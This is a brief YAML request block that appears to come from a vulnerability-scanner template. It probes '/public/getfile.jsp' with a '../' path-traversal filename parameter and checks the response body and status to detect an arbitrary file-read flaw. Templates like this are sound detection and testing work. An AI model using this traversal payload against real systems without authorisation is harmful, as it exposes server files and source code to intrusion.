requests:
  - method: GET
    path:
      - '{{BaseURL}}/public/getfile.jsp?user=1&prop=activex&filename=../public/getfile&extname=jsp'

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "filename"
        part: body

      - type: status
        status:
          - 200

